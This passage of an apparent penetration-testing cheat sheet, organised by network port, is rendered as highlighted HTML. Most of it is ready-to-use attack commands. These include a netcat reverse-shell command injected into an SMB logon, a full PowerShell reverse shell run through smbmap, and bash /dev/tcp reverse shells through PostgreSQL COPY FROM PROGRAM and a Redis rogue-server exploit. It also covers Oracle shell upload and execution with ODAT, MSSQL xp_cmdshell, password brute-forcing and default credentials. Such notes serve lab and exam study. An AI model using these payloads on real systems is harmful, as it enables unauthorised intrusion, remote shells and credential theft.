<span class="n">logon</span><span class="w"> </span><span class="s2">&quot;/=`nc 10.10.14.5 4444 -e /bin/bash`&quot;</span>

<span class="c1"># smbmap</span>
<span class="n">smbmap</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">administrator</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">asdf1234</span><span class="w"> </span><span class="c1">#Enum</span>
<span class="n">smbmap</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="s1">&#39;P@$$w0rd1234!&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">DOMAINNAME</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="s1">&#39;net group &quot;Domain Admins&quot; /domain&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="c1">#RCE</span>
<span class="n">smbmap</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="s1">&#39;P@$$w0rd1234!&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">L</span><span class="w"> </span><span class="c1"># Drive Listing</span>
<span class="n">smbmap</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="s1">&#39;P@$$w0rd1234!&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">ABC</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="s1">&#39;powershell -command &quot;function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=&quot;&quot;&quot;&quot;192.168.0.X&quot;&quot;&quot;&quot;; $port=&quot;&quot;&quot;&quot;4445&quot;&quot;&quot;&quot;;$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=&quot;&quot;&quot;&quot;cmd.exe&quot;&quot;&quot;&quot;  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out=&quot;&quot;&quot;&quot; &quot;&quot;&quot;&quot;}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};&quot;&#39;</span><span class="w"> </span><span class="c1"># Reverse Shell</span>

<span class="c1"># Check</span>
\<span class="n">Policies</span>\<span class="p">{</span><span class="n">REG</span><span class="p">}</span>\<span class="n">MACHINE</span>\<span class="n">Preferences</span>\<span class="n">Groups</span>\<span class="n">Groups</span><span class="o">.</span><span class="n">xml</span><span class="w"> </span><span class="n">look</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">user</span><span class="o">&amp;</span><span class="k">pass</span><span class="w"> </span><span class="s2">&quot;gpp-decrypt &quot;</span>
</code></pre></div>

<h2>Port 143/993 IMAP</h2>
<p>REF: Postfish</p>
<p>Banner Grab</p>
<div class="highlight"><pre><span></span><code>telnet 10.11.1.111 143 #Connect to read emails

openssl s_client -connect 10.11.1.111:993 -quiet  #Encrypted connection
</code></pre></div>

<h2>Port 161/162 UDP - SNMP</h2>
<div class="highlight"><pre><span></span><code>nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes 10.11.1.111
snmp-check 10.11.1.111 -c public|private|community
</code></pre></div>

<h2>LDAP - 389,636</h2>
<div class="highlight"><pre><span></span><code><span class="n">ldapsearch</span><span class="w"> </span><span class="o">-</span><span class="n">h</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">389</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="o">-</span><span class="n">b</span><span class="w"> </span><span class="s2">&quot;dc=mywebsite,dc=com&quot;</span>
<span class="n">ldapsearch</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="o">-</span><span class="n">h</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">D</span><span class="w"> </span><span class="s1">&#39;DOMAIN\user&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">w</span><span class="w"> </span><span class="s1">&#39;hash-password&#39;</span>
<span class="n">ldapdomaindump</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s1">&#39;DOMAIN\user&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="s1">&#39;hash-password&#39;</span>
<span class="n">patator</span><span class="w"> </span><span class="n">ldap_login</span><span class="w"> </span><span class="n">host</span><span class="o">=</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="mi">1</span><span class="o">=/</span><span class="n">root</span><span class="o">/</span><span class="n">Downloads</span><span class="o">/</span><span class="n">passwords_ssh</span><span class="o">.</span><span class="n">txt</span><span class="w"> </span><span class="n">user</span><span class="o">=</span><span class="n">hsmith</span><span class="w"> </span><span class="n">password</span><span class="o">=</span><span class="n">FILE1</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="n">ignore</span><span class="p">:</span><span class="n">mesg</span><span class="o">=</span><span class="s1">&#39;Authentication failed.&#39;</span>
</code></pre></div>

<h2>HTTPS - 443</h2>
<p>Read the actual SSL CERT to:</p>
<ul>
<li>find out potential correct vhost to GET</li>
<li>is the clock skewed</li>
<li>any names that could be usernames for bruteforce/guessing.</li>
</ul>
<div class="highlight"><pre><span></span><code>sslscan 10.11.1.111:443
./testssl.sh -e -E -f -p  -S -P -c -H -U TARGET-HOST &gt; OUTPUT-FILE.html
nmap -sV --script=ssl-heartbleed 10.1.10.111
mod_ssl,OpenSSL version Openfuck
</code></pre></div>

<h2>500 - ISAKMP IKE</h2>
<div class="highlight"><pre><span></span><code>ike-scan 10.11.1.111
</code></pre></div>

<h2>513 - Rlogin</h2>
<div class="highlight"><pre><span></span><code>apt install rsh-client
rlogin -l root 10.11.1.111
</code></pre></div>

<h2>541 - FortiNet SSLVPN</h2>
<p><a href="https://help.fortinet.com/fos50hlp/54/Content/FortiOS/fortigate-ports-and-protocols-54/Images/FortiGate.png">Fortinet Ports Guide</a></p>
<p><a href="https://opensecurity.global/forums/topic/181-fortinet-ssl-vpn-vulnerability-from-may-2019-being-exploited-in-wild/?__cf_chl_jschl_tk__=42e37b31a0585f7dae3dbce18cafde7c39b81976-1578385705-0-AcuYzrPMO1OuMo59JSPYyzZjiXNbMAIl6sKiXwhQRbMUMZq1Kp3VmWqIVXWZdzTZgFCecXue1Z6xXxU-Rql_GT_ovKiar_-i0CUCKFS85bfNXnUzuOuIwomXje-kH87mNbVHzzh9ediRfVWbJjwtO-ttLEYi7quczLlHQk38UqcumrARs77RrK2mj9zOb8Uwhv6av4QZ9od4fgAIl-F4Kff26MPQjs4LRHsgk5zH6RVwFMP8NdOnCrrzkkGH6_R9Dtw89_QtiOsH1nKB0hBDbtJ2O9AkkMDqw7tl1ip_pVDfnw1lvaZtFq1sRqgYwpan-n6n9f58Xdjcj2UGFKdE32OS7Ete8X7RwXUV9FGUSOhAM5_iK0kMNJg3mskrFVQz0lONaZVvFRdf_1rp69J4oRVat1m7KIQEGpRDe4OvYUb7pfQkNKLcK5s_lVIj2SAJQQ">SSL VPN Leak</a></p>
<h2>Port 554 - RTSP</h2>
<ul>
<li>Web interface, transfer images, streaming</li>
</ul>
<h2>Port 873 - Rsync</h2>
<p>https://book.hacktricks.xyz/pentesting/873-pentesting-rsync</p>
<div class="highlight"><pre><span></span><code><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">vn</span><span class="w"> </span><span class="mf">192.168.152.126</span><span class="w"> </span><span class="mi">873</span>

<span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="s">&quot;rsync-list-modules&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">873</span><span class="w">  </span><span class="mf">192.168.152.126</span><span class="w"> </span><span class="o">--</span><span class="n">List</span><span class="w"> </span><span class="n">Shares</span>

<span class="n">rsync</span><span class="w"> </span><span class="o">-</span><span class="n">av</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">kali</span><span class="o">/</span><span class="p">.</span><span class="n">ssh</span><span class="w"> </span><span class="n">rsync</span><span class="o">:</span><span class="c1">//fox@192.168.152.126/fox/.ssh</span>
</code></pre></div>

<h2>Port 1030/1032/1033/1038</h2>
<p>Used by RPC to connect in domain network.</p>
<h2>MSSQL - 1433</h2>
<div class="highlight"><pre><span></span><code><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">1433</span><span class="w"> </span><span class="o">-</span><span class="n">sU</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">ms</span><span class="o">-</span><span class="n">sql</span><span class="o">-</span><span class="n">info</span><span class="o">.</span><span class="n">nse</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
<span class="n">use</span><span class="w"> </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_ping</span>
<span class="n">use</span><span class="w"> </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_login</span>
<span class="n">use</span><span class="w"> </span><span class="n">exploit</span><span class="o">/</span><span class="n">windows</span><span class="o">/</span><span class="n">mssql</span><span class="o">/</span><span class="n">mssql_payload</span>
<span class="n">sqsh</span><span class="w"> </span><span class="o">-</span><span class="n">S</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">U</span><span class="w"> </span><span class="n">sa</span>
<span class="w">    </span><span class="n">xp_cmdshell</span><span class="w"> </span><span class="s1">&#39;date&#39;</span>
<span class="w">    </span><span class="n">go</span>
</code></pre></div>

<h2>Port 1521 - Oracle</h2>
<div class="highlight"><pre><span></span><code><span class="n">oscanner</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="mi">1521</span>
<span class="n">tnscmd10g</span><span class="w"> </span><span class="n">version</span><span class="w"> </span><span class="o">-</span><span class="n">h</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
<span class="n">tnscmd10g</span><span class="w"> </span><span class="n">status</span><span class="w"> </span><span class="o">-</span><span class="n">h</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
<span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">1521</span><span class="w"> </span><span class="o">-</span><span class="n">A</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
<span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">1521</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">oracle</span><span class="o">-</span><span class="n">tns</span><span class="o">-</span><span class="n">version</span><span class="p">,</span><span class="n">oracle</span><span class="o">-</span><span class="n">sid</span><span class="o">-</span><span class="n">brute</span><span class="p">,</span><span class="n">oracle</span><span class="o">-</span><span class="n">brute</span>
<span class="n">MSF</span><span class="p">:</span><span class="w"> </span><span class="n">good</span><span class="w"> </span><span class="n">modules</span><span class="w"> </span><span class="n">under</span><span class="w"> </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">admin</span><span class="o">/</span><span class="n">oracle</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">scanner</span><span class="o">/</span><span class="n">oracle</span>

<span class="o">./</span><span class="n">odat</span><span class="o">-</span><span class="n">libc2</span><span class="o">.</span><span class="mi">5</span><span class="o">-</span><span class="n">i686</span><span class="w"> </span><span class="n">all</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">1521</span>
<span class="o">./</span><span class="n">odat</span><span class="o">-</span><span class="n">libc2</span><span class="o">.</span><span class="mi">5</span><span class="o">-</span><span class="n">i686</span><span class="w"> </span><span class="n">sidguesser</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">1521</span>
<span class="o">./</span><span class="n">odat</span><span class="o">-</span><span class="n">libc2</span><span class="o">.</span><span class="mi">5</span><span class="o">-</span><span class="n">i686</span><span class="w"> </span><span class="n">passwordguesser</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">1521</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">XE</span>

<span class="n">Upload</span><span class="w"> </span><span class="n">reverse</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">ODAT</span><span class="p">:</span>
<span class="o">./</span><span class="n">odat</span><span class="o">-</span><span class="n">libc2</span><span class="o">.</span><span class="mi">5</span><span class="o">-</span><span class="n">i686</span><span class="w"> </span><span class="n">utlfile</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">1521</span><span class="w"> </span><span class="o">-</span><span class="n">U</span><span class="w"> </span><span class="n">scott</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="n">tiger</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">XE</span><span class="w"> </span><span class="o">--</span><span class="n">sysdba</span><span class="w"> </span><span class="o">--</span><span class="n">putFile</span><span class="w"> </span><span class="n">c</span><span class="p">:</span><span class="o">/</span><span class="w"> </span><span class="n">shell</span><span class="o">.</span><span class="n">exe</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">exe</span>

<span class="ow">and</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">it</span><span class="p">:</span>
<span class="o">./</span><span class="n">odat</span><span class="o">-</span><span class="n">libc2</span><span class="o">.</span><span class="mi">5</span><span class="o">-</span><span class="n">i686</span><span class="w"> </span><span class="n">externaltable</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">1521</span><span class="w"> </span><span class="o">-</span><span class="n">U</span><span class="w"> </span><span class="n">scott</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="n">tiger</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="n">XE</span><span class="w"> </span><span class="o">--</span><span class="n">sysdba</span><span class="w"> </span><span class="o">--</span><span class="n">exec</span><span class="w"> </span><span class="n">c</span><span class="p">:</span><span class="o">/</span><span class="w"> </span><span class="n">shell</span><span class="o">.</span><span class="n">exe</span>
</code></pre></div>

<h2>Port 2049 - NFS</h2>
<div class="highlight"><pre><span></span><code><span class="nv">showmount</span><span class="w"> </span><span class="o">-</span><span class="nv">e</span><span class="w"> </span><span class="mi">10</span>.<span class="mi">11</span>.<span class="mi">1</span>.<span class="mi">111</span>

<span class="k">If</span><span class="w"> </span><span class="nv">you</span><span class="w"> </span><span class="nv">find</span><span class="w"> </span><span class="nv">anything</span><span class="w"> </span><span class="nv">you</span><span class="w"> </span><span class="nv">can</span><span class="w"> </span><span class="nv">mount</span><span class="w"> </span><span class="nv">it</span><span class="w"> </span><span class="nv">like</span><span class="w"> </span><span class="nv">this</span>:

<span class="nv">mount</span><span class="w"> </span><span class="mi">10</span>.<span class="mi">11</span>.<span class="mi">1</span>.<span class="mi">111</span>:<span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="nv">tmp</span><span class="o">/</span><span class="nv">NFS</span>
<span class="nv">mount</span><span class="w"> </span><span class="o">-</span><span class="nv">t</span><span class="w"> </span><span class="mi">10</span>.<span class="mi">11</span>.<span class="mi">1</span>.<span class="mi">111</span>:<span class="o">/</span><span class="w"> </span><span class="o">/</span><span class="nv">tmp</span><span class="o">/</span><span class="nv">NFS</span>
</code></pre></div>

<h2>Port 2100 - Oracle XML DB</h2>
<div class="highlight"><pre><span></span><code><span class="n">FTP</span><span class="o">:</span>
<span class="w">    </span><span class="n">sys</span><span class="o">:</span><span class="n">sys</span>
<span class="w">    </span><span class="n">scott</span><span class="o">:</span><span class="n">tiger</span>
</code></pre></div>

<p>Default passwords
https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm</p>
<h2>3306 - MySQL</h2>
<p>https://book.hacktricks.xyz/pentesting/pentesting-mysql#basic-information</p>
<div class="highlight"><pre><span></span><code><span class="n">nmap</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">mysql</span><span class="o">-</span><span class="n">databases</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">mysql</span><span class="o">-</span><span class="n">empty</span><span class="o">-</span><span class="n">password</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">mysql</span><span class="o">-</span><span class="k">enum</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">mysql</span><span class="o">-</span><span class="n">info</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">mysql</span><span class="o">-</span><span class="n">variables</span><span class="o">.</span><span class="n">nse</span><span class="p">,</span><span class="n">mysql</span><span class="o">-</span><span class="n">vuln</span><span class="o">-</span><span class="n">cve2012</span><span class="o">-</span><span class="mf">2122.</span><span class="n">nse</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">3306</span>

<span class="n">mysql</span><span class="w"> </span><span class="o">--</span><span class="n">host</span><span class="o">=</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="o">-</span><span class="n">p</span>

<span class="n">MYSQL</span><span class="w"> </span><span class="n">UDF</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">adampalmer</span><span class="o">.</span><span class="n">me</span><span class="o">/</span><span class="n">iodigitalsec</span><span class="o">/</span><span class="mi">2013</span><span class="o">/</span><span class="mi">08</span><span class="o">/</span><span class="mi">13</span><span class="o">/</span><span class="n">mysql</span><span class="o">-</span><span class="n">root</span><span class="o">-</span><span class="n">to</span><span class="o">-</span><span class="n">system</span><span class="o">-</span><span class="n">root</span><span class="o">-</span><span class="n">with</span><span class="o">-</span><span class="n">udf</span><span class="o">-</span><span class="k">for</span><span class="o">-</span><span class="n">windows</span><span class="o">-</span><span class="ow">and</span><span class="o">-</span><span class="n">linux</span><span class="o">/</span>
</code></pre></div>

<h2>Port 3339 - Oracle web interface</h2>
<ul>
<li>Basic info about web service (apache, nginx, IIS)</li>
</ul>
<h2>RDP - 3389</h2>
<div class="highlight"><pre><span></span><code>nmap -p 3389 --script=rdp-vuln-ms12-020.nse
rdesktop -u username -p password -g 85% -r disk:share=/root/ 10.11.1.111
rdesktop -u guest -p guest 10.11.1.111 -g 94%
ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://10.11.1.111
xfreerdp /u:bill /p:Password! /v:10.11.1.111
</code></pre></div>

<h2>PostgreSQL - 5432/5433</h2>
<p>REF: Nibbles, Splodge</p>
<p>https://book.hacktricks.xyz/pentesting/pentesting-postgresql</p>
<p>https://book.hacktricks.xyz/pentesting-web/sql-injection/postgresql-injection#rce-from-version-9.3</p>
<div class="highlight"><pre><span></span><code>psql -U &lt;myuser&gt; # Open psql console with user
psql -h &lt;host&gt; -U &lt;username&gt; -d &lt;database&gt; # Remote connection
psql -h &lt;host&gt; -p &lt;port&gt; -U &lt;username&gt; -W &lt;password&gt; &lt;database&gt; # Remote connection

\list # List Databases
\c postgres # Connect to DB
\d &lt;table&gt; # List tables

Priv Esc via Postgres

CREATE TABLE cmd(cmd_output text); 
COPY cmd FROM PROGRAM &#39;bash -i &gt;&amp; /dev/tcp/192.168.49.114/80 0&gt;&amp;1&#39;; 
</code></pre></div>

<h2>Erland Port Mapper - 4369</h2>
<p>https://book.hacktricks.xyz/pentesting/4369-pentesting-erlang-port-mapper-daemon-epmd</p>
<h2>VNC - 5900</h2>
<div class="highlight"><pre><span></span><code>nmap --script=vnc-info,vnc-brute,vnc-title -p 5900 10.11.1.111

vncviewer 127.0.0.1:5000 -passwd secret
</code></pre></div>

<h2>WinRM - 5985</h2>
<div class="highlight"><pre><span></span><code>https://github.com/Hackplayers/evil-winrm
gem install evil-winrm
evil-winrm -i 10.11.1.111 -u Administrator -p &#39;password1&#39;
evil-winrm -i 10.11.1.111 -u Administrator -H &#39;hash-pass&#39; -s /scripts/folder
</code></pre></div>

<h2>Redis - 6379</h2>
<p>Ref: Sybaris, Wombo</p>
<div class="highlight"><pre><span></span><code>https://github.com/Avinash-acid/Redis-Server-Exploit
python redis.py 10.10.10.160 redis

https://github.com/vulhub/redis-rogue-getshell.git
sudo python3 redis-master.py -r 192.168.89.69 -L 192.168.49.89 -P 80 -f RedisModulesSDK/exp.so -c &quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.49.89/8080 0&gt;&amp;1&#39;&quot;
</code></pre></div>

<h2>MsDeploy - 8172</h2>
<div class="highlight"><pre><span></span><code>Microsoft IIS Deploy port
IP:8172/msdeploy.axd
</code></pre></div>

<h2>Port 27017 - MongoDB</h2>
<p>https://book.hacktricks.xyz/pentesting/27017-27018-mongodb</p>
<div class="highlight"><pre><span></span><code><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">sV</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="s2">&quot;mongo* and default&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">27017</span><span class="w"> </span><span class="o">&lt;</span><span class="n">IP</span><span class="o">&gt;</span><span class="w"> </span><span class="c1">#By default all the nmap mongo enumerate scripts are used</span>
</code></pre></div>

<h2>Webdav</h2>
<div class="highlight"><pre><span></span><code>davtest -cleanup -url http://target
cadaver http://target
</code></pre></div>

<h2>Unknown ports</h2>
<ul>
<li><code>amap -d 10.11.1.111 8000</code></li>
<li>netcat: makes connections to ports. Can echo strings or give shells: <code>nc -nv 10.11.1.111 110</code></li>
<li>sfuzz: can connect to ports, udp or tcp, refrain from closing a connection,   using basic HTTP configurations</li>
<li>Try zone transfer for subdomains: <code>dig axfr @10.11.1.111 hostname.box</code>, <code>dnsenum 10.11.1.111</code>, <code>dnsrecon -d domain.com -t axfr</code></li>
</ul>
<p>Try admin:admin, user:user</p>
<h2>Port 80 - Web server</h2>
<ul>
<li>Basics:</li>
<li>Navigate &amp;&amp; robots.txt</li>
<li>Headers</li>
<li>Source Code (Read for comments)</li>
<li>Pay attention to errors (Is there a protocol relationship)</li>
</ul>
<div class="highlight"><pre><span></span><code><span class="c1"># Nikto</span>
<span class="n">nikto</span><span class="w"> </span><span class="o">-</span><span class="n">h</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>

<span class="c1"># Nikto with squid proxy</span>
<span class="n">nikto</span><span class="w"> </span><span class="o">-</span><span class="n">h</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">useproxy</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="p">:</span><span class="mi">4444</span>

<span class="c1"># CMS Explorer</span>
<span class="n">cms</span><span class="o">-</span><span class="n">explorer</span><span class="w"> </span><span class="o">-</span><span class="n">url</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">type</span><span class="w"> </span><span class="p">[</span><span class="n">Drupal</span><span class="p">,</span><span class="w"> </span><span class="n">WordPress</span><span class="p">,</span><span class="w"> </span><span class="n">Joomla</span><span class="p">,</span><span class="w"> </span><span class="n">Mambo</span><span class="p">]</span>

<span class="c1"># Wordpress Techniques</span>
<span class="n">Ref</span><span class="p">:</span><span class="w"> </span><span class="n">Maria</span><span class="p">,</span><span class="w"> </span><span class="n">Fail</span><span class="p">,</span><span class="w"> </span><span class="n">Shenzi</span><span class="p">,</span><span class="w"> </span><span class="n">Nukem</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">hackingarticles</span><span class="o">.</span><span class="ow">in</span><span class="o">/</span><span class="n">wordpress</span><span class="o">-</span><span class="n">reverse</span><span class="o">-</span><span class="n">shell</span><span class="o">/</span><span class="w"> </span>

<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">137.167</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">themes</span><span class="o">/</span><span class="n">twentynineteen</span><span class="o">/</span><span class="mf">404.</span><span class="n">php</span><span class="w"> </span><span class="c1"># Url to execute reverse shell</span>

<span class="n">Note</span><span class="p">:</span><span class="w"> </span><span class="n">Use</span><span class="w"> </span><span class="s1">&#39;grep -R backup_scripts 2&gt;/dev/null&#39;</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">look</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">cron</span><span class="w"> </span><span class="n">related</span><span class="w"> </span><span class="n">directories</span><span class="o">.</span><span class="w"> </span>

<span class="c1"># WPScan (vp = Vulnerable Plugins, vt = Vulnerable Themes, u = Users)</span>
<span class="n">wpscan</span><span class="w"> </span><span class="o">--</span><span class="n">url</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
<span class="n">wpscan</span><span class="w"> </span><span class="o">--</span><span class="n">url</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">--</span><span class="n">enumerate</span><span class="w"> </span><span class="n">vp</span>
